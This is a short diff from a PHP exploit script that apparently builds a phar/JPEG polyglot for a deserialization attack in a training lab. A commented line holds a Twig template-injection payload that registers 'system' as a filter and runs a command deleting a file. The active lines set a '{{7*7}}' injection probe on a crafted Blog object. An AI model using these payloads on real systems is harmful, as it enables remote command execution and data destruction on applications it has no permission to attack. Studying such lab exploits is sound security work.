@@ -103,8 +103,8 @@ function generate_polyglot($phar, $jpeg){
 // $blog = new Blog("abc","{{_self.env.registerUndefinedFilterCallback('system')}}{{_self.env.getFilter('rm /home/carlos/morale.txt')}}");
 
 // $object = new CustomTemplate($blog);
-$object = new CustomTemplate();
-$blog = new Blog();
+$object = new CustomTemplate;
+$blog = new Blog;
 $blog->desc = "{{7*7}}";
 $blog->user = 'user';
 $object->template_file_path = $blog;
